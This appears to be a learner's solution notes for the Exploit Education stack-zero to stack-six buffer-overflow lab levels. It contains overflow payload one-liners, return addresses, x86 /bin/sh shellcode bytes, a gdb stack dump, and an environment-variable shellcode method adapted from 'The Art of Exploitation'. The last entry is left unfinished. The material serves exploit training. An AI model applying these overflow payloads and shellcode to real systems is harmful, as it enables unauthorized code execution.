##############################   soln 0 #######################################################
stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
This is easy just use number of with the length of string 
############################     soln1      ####################################################
stack-one
./stack-one $(python -c  'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+"\x62\x59\x6c\x49"')
############################      soln2 ##############################################
stack-two.c
export ExploitEducation=$(python -c  'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+"\x0a\x09\x0a\x0d"')
###############################  soln3 ##############################################################
    #You can use gdb and objdump to determine where the complete_level() function is in memory.
    disasamble complete_level copy the address and make it little endian and paste the address in "\x35\x85\x04\x08" 
exploit return to function python -c 'print ("A"*64 + "\x35\x85\x04\x08")' | ./stack-three
################################optional due to they not say to exploit it########################################
stack-three can be hijacked
stratagy:-offset = 64 and includeing eip is 68 == shellcode(28) + padding(36) + eip/return(4) == 68
 →  0x80485bb <main+102>       call   eax
payload='\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
padding="A"*32
eip="\x50\xd6\xff\xff"
0xffffd640:	0x0804831c	0x08048611	0x00000000	0x41414141
0xffffd650:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd660:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd670:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd680:	0x41414141	0x41414141	0x41414141	0x00000000
##############################################################################################################
#################################################### soln 4 ###################################################
#You can use gdb and objdump to determine where the complete_level() function is in memory.
#disasamble complete_level
#x/14x complete_level 
funtion complete level @ 0x080484e5
└──╼ $/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 150 -q 37634136
[*] Exact match at offset 80
 python -c 'print ("A"*80 + "\xe5\x84\x04\x08")' | ./stack-four 
done
can be exploited 
###################################################################################################
#################################################### soln 5 #######################################
./stack-five
""""""""""""""""""""""'Code Taken From The Art Of Exploitation (All Credit to Them)'"""""""""""""""""""""""""""""""
Chapter 3:- getenvar.c pageNo:147
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
!:Compile this c program gcc -m32 <prgram_name> -o <output_file_name>
int main(int argc, char *argv[]) {
char *ptr;
if(argc < 3) {
printf("Usage: %s <environment var> <target program name>\n", argv[0]);
exit(0);
}
ptr = getenv(argv[1]); /* Get env var location. */
ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
printf("%s will be at %p\n", argv[1], ptr);
}
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
2:write just the payload 
i user is this code :\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
##########python2 or 3 script
payload=<shellcode\arbitory_code>
print payload
#############end
3:python ./<program_name_of_payload>.py > shell.bin 
##############
4:export SHEL=$(python2 -c 'print "\x90"*100')$(cat <shell.bin>)
###################
5: ./<program_of_c_elf_file> <enviroment_var_name> <target_program_name> 
##################
6: copy the address of shellcode make it into "little endian" means in reverse order format 
########python
<adress_of_SHELLL>*<number_of_offset+eip/return_add> #if the calcution of offset+eip is more than the output that its alright 
./<>.py > shell
######note : (elf) is in linux executable file like in window (.exe) 
NOTE="Please change the file name of both if you some like this type of "x04" this is not correct address"
7:Executon:
(cat shell; cat) ./<program_name_to_be_exploited> 
# debug where goes wrong and (sudo dmesg) to see more details (strace) ./stack-five < shellcode
####################################################### soln 6 ########################################
./stack-six
offset=123(not including eip)+4==127 //but not
